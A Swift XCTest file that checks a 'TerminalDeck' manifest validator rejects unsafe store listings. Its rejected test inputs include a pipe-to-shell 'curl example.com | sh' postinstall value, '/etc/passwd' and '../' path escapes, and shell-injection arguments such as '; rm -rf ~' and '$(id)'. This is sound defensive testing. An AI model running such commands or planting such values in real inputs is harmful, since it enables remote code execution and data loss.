import Foundation
import XCTest
import TerminalDeckNativeCore
@testable import TerminalDeckBackend

final class BackendSharedManifestTests: XCTestCase {
    private func good(_ patch: NativeRPCValue = .object([])) -> NativeRPCValue {
        .object([.init("terminaldeck", .number(1)), .init("publisher", .string("acme")), .init("id", .string("pr-review")), .init("kind", .string("skill")), .init("name", .string("Pull request review")), .init("summary", .string("Reads a diff and writes the review.")), .init("version", .string("1.0.0")), .init("licence", .string("MIT")), .init("category", .string("code")), .init("tags", .array([.string("review"), .string("git")])), .init("agents", .array([.string("claude"), .string("codex")])), .init("platforms", .array([.string("darwin"), .string("linux")])), .init("delivery", .string("repo")), .init("pricing", .object([.init("model", .string("free"))])), .init("links", .object([.init("repo", .string("https://github.com/acme/pr-review"))])), .init("needs", .array([])), .init("install", .object([.init("dir", .string("skills/pr-review"))]))]).merging(patch)
    }
    private func parse(_ patch: NativeRPCValue = .object([])) -> BackendSharedStoreManifest.Parse {
        BackendSharedStoreManifest.parse(good(patch).compact, expectedPublisher: "acme", expectedID: "pr-review")
    }
    private func patch(_ key: String, _ value: NativeRPCValue) -> NativeRPCValue { .object([.init(key, value)]) }
    private func mcp(_ patch: NativeRPCValue = .object([])) -> NativeRPCValue {
        .object([.init("runtime", .string("node")), .init("package", .string("@acme/mcp-thing")), .init("args", .array([])), .init("inputs", .array([])), .init("token", .string("@acme/mcp-thing"))]).merging(patch)
    }
    func testNormalizedShapeAndIdentityDisagreement() throws {
        let manifest = try XCTUnwrap(parse().value)
        XCTAssertEqual(manifest["pricing"], .object([.init("model", .string("free")), .init("note", .null), .init("url", .null)]))
        XCTAssertEqual(manifest["install"]["kind"].string, "skill")
        XCTAssertEqual(parse(patch("id", .string("pr-reviewer"))).why, "this manifest calls itself pr-reviewer, and it was offered as pr-review")
        XCTAssertEqual(parse(patch("publisher", .string("notacme"))).why, "this manifest says it belongs to notacme, and it was offered as acme")
    }
    func testUnknownKeysAtEveryLevel() {
        XCTAssertEqual(parse(patch("postinstall", .string("curl example.com | sh"))).why, "the manifest has a key this app does not know about: postinstall")
        XCTAssertEqual(parse(patch("pricing", .object([.init("model", .string("free")), .init("currency", .string("usd"))]))).why, "pricing has a key this app does not know about: currency")
        XCTAssertEqual(parse(patch("links", .object([.init("repo", .string("https://github.com/acme/pr-review")), .init("mirror", .string("https://x.example"))]))).why, "links has a key this app does not know about: mirror")
        XCTAssertEqual(parse(patch("install", .object([.init("dir", .string(".")), .init("command", .string("sh setup.sh"))]))).why, "install has a key this app does not know about: command")
    }
    func testPathsCannotEscapeAndAiFileMustBeText() {
        for (path, part) in [("/etc/passwd", "cannot start with /"), ("../outside", "must not step outside"), ("skills\\thing", "must use /"), ("C:/windows", "cannot name a drive"), ("a//b", "empty folder name"), ("a\0b", "character a file name cannot have")] {
            XCTAssertTrue(parse(patch("install", .object([.init("dir", .string(path))]))).why?.contains(part) == true)
        }
        XCTAssertNotNil(parse(patch("install", .object([.init("dir", .string("."))]))).value)
        XCTAssertEqual(parse(patch("aiFile", .string("overview.exe"))).why, "aiFile must be a .txt or a .md file")
    }
    func testMcpCommandOwnsPunctuationAndPlaceholders() throws {
        let root = NativeRPCValue.object([.init("key", .string("ROOT")), .init("label", .string("Folder")), .init("hint", .string("An absolute path")), .init("kind", .string("path")), .init("into", .string("arg")), .init("required", .bool(true))])
        let configured = mcp(.object([.init("args", .array([.string("--root"), .string("${input:ROOT}")])), .init("inputs", .array([root]))]))
        let result = BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: configured, agents: ["claude"])
        XCTAssertEqual(BackendSharedStoreManifest.composeMcpCommand(try XCTUnwrap(result.value)), "npx -y @acme/mcp-thing --root ${ROOT}")
        for arg in ["--root /etc", "; rm -rf ~", "`id`", "$(id)", "&& curl x", "|sh"] {
            XCTAssertEqual(BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: mcp(patch("args", .array([.string(arg)]))), agents: []).why, "install.args[0] may only be a plain word or ${input:KEY}")
        }
        XCTAssertEqual(BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: mcp(patch("args", .array([.string("${input:TOKEN}")]))), agents: []).why, "install.args[0] uses ${input:TOKEN}, which is not declared")
        XCTAssertTrue(BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: mcp(patch("runtime", .string("docker"))), agents: []).why?.contains("this app builds") == true)
        XCTAssertTrue(BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: mcp(patch("package", .string("https://x.example/x.tgz"))), agents: []).why?.contains("not a path or an address") == true)
        XCTAssertEqual(BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: mcp(patch("token", .string("other"))), agents: []).why, "install.token must appear in the command this app builds, and other does not")
        XCTAssertEqual(BackendSharedStoreManifest.composeMcpCommand(mcp(patch("runtime", .string("python")))), "uvx @acme/mcp-thing")
        let badInput = root.setting("default", .string("x"))
        XCTAssertEqual(BackendSharedStoreManifest.readInstallBlock(kind: "mcp", value: mcp(patch("inputs", .array([badInput]))), agents: []).why, "install.inputs[0] has a key this app does not know about: default")
    }
    func testHooksPriceAndOffsiteRules() {
        let hooks = NativeRPCValue.object([.init("script", .string("hooks/notify.mjs")), .init("events", .array([.string("PermissionRequest")])), .init("runtime", .string("node"))])
        XCTAssertEqual(BackendSharedStoreManifest.readInstallBlock(kind: "hooks", value: hooks, agents: ["claude", "codex"]).why, "codex has no hook called PermissionRequest, and this item says it works with codex")
        XCTAssertEqual(BackendSharedStoreManifest.readInstallBlock(kind: "hooks", value: hooks.setting("runtime", .string("bash")), agents: []).why, "install.runtime must be one of: node")
        XCTAssertTrue(parse(patch("pricing", .object([.init("model", .string("paid"))]))).why?.contains("pricing.note is required") == true)
        let offsite = NativeRPCValue.object([.init("kind", .string("tool")), .init("delivery", .string("off-site")), .init("install", .null), .init("pricing", .object([.init("model", .string("paid")), .init("note", .string("$29 once.")), .init("url", .string("https://acme.example/buy"))]))])
        XCTAssertNotNil(parse(offsite).value)
        XCTAssertEqual(parse(offsite.setting("install", .object([.init("dir", .string("."))]))).why, "an off-site listing installs nothing here, so it cannot carry an install block")
        XCTAssertEqual(parse(offsite.setting("pricing", .object([.init("model", .string("paid")), .init("note", .string("$29 once.")), .init("url", .string("https://203.0.113.7/buy"))]))).why, "pricing.url must name a domain, not a bare address")
    }
    func testEveryKindAndTierFromActualFiles() {
        let installs: [(String, NativeRPCValue)] = [
            ("skill", .object([.init("dir", .string("."))])), ("instructions", .object([.init("file", .string("INSTRUCTIONS.md"))])),
            ("hooks", .object([.init("script", .string("hooks/notify.mjs")), .init("events", .array([.string("SessionStart")])), .init("runtime", .string("node"))])),
            ("mcp", mcp()), ("extension", .object([.init("dir", .string("extension")), .init("reach", .array([.string("*.example.com")]))])),
            ("routine", .object([.init("file", .string("routines/nightly.md"))])), ("tool", .null),
        ]
        for (kind, install) in installs { XCTAssertNotNil(parse(.object([.init("kind", .string(kind)), .init("install", install)])).value) }
        XCTAssertEqual(BackendSharedStoreManifest.deriveTier(kind: "skill", files: [.init(path: "SKILL.md", bytes: 10, mode: 0o100644)]).tier, 1)
        XCTAssertEqual(BackendSharedStoreManifest.deriveTier(kind: "skill", files: [.init(path: "bin/run.sh", bytes: 10, mode: 0o100644)]).because, "it ships bin/run.sh")
        XCTAssertEqual(BackendSharedStoreManifest.deriveTier(kind: "skill", files: [.init(path: "bin/run", bytes: 10, mode: 0o100755)]).tier, 2)
        for kind in BackendSharedStoreManifest.kinds { XCTAssertGreaterThanOrEqual(BackendSharedStoreManifest.deriveTier(kind: kind, files: []).tier, BackendSharedStoreManifest.kindTierFloor[kind]!) }
    }
    func testClosedListsFormatAndMalformedBytes() {
        XCTAssertEqual(parse(patch("terminaldeck", .number(2))).why, "this manifest is written for format 2, and this app reads format 1")
        XCTAssertEqual(parse(patch("version", .string("v1"))).why, "version must look like 1.2.3")
        for key in ["licence", "category"] { XCTAssertNotNil(parse(patch(key, .string("invented"))).why) }
        XCTAssertEqual(parse(patch("links", .object([.init("repo", .string("http://github.com/acme/pr-review"))]))).why, "links.repo must be an https address")
        for text in ["", "null", "[]", "{", "true", "\"a string\""] { XCTAssertNotNil(BackendSharedStoreManifest.parse(text, expectedPublisher: "acme", expectedID: "pr-review").why) }
        XCTAssertEqual(BackendSharedStoreManifest.parse(String(repeating: "x", count: 65537), expectedPublisher: "acme", expectedID: "pr-review").why, "a manifest must be 65536 bytes or fewer")
    }
}
